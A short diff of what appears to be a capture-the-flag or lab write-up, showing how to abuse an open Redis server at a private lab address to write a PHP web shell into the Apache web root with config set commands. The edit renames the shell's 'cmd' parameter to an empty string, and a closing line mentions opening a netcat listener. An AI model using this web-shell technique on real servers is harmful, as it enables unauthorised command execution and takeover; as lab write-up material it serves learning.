@@ -16,7 +16,7 @@ When connecting to redis we can set write a file to the main apache dir and crea
 redis-cli -h 10.10.103.145
 >config set dir /var/www/html
 >config set dbfilename shell.php
->set test "<?php system($_GET['cmd']);?>"
+>set test "<?php system($_GET['']);?>"
 ```
 
 Before we visit our new page we should open a netcat session:
